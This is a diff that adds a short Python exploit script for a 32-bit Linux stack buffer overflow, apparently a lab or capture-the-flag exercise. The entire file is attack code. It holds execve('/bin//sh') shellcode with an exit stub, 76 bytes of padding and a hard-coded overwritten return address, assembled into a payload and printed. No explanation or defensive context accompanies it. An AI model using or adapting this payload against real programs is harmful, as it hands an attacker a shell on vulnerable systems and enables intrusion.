@@ -1,0 +1,26 @@
+from struct import pack
+
+shell_addr = pack("<I", 0x0804a010)
+
+shellcode = (
+    b"\x31\xc0"
+    b"\x50"
+    b"\x68\x2f\x2f\x73\x68"
+    b"\x68\x2f\x62\x69\x6e"
+    b"\x89\xe3"
+    b"\x89\xc1"
+    b"\x89\xc2"
+    b"\xb0\x0b"
+    b"\xcd\x80"
+    b"\x31\xc0"
+    b"\x40"
+    b"\xcd\x80"
+)
+
+padding = b"A" * 76
+
+ret_addr = pack("<I", 0x0804a00c)
+
+payload = shell_addr + shellcode + padding + ret_addr
+
+print(payload)
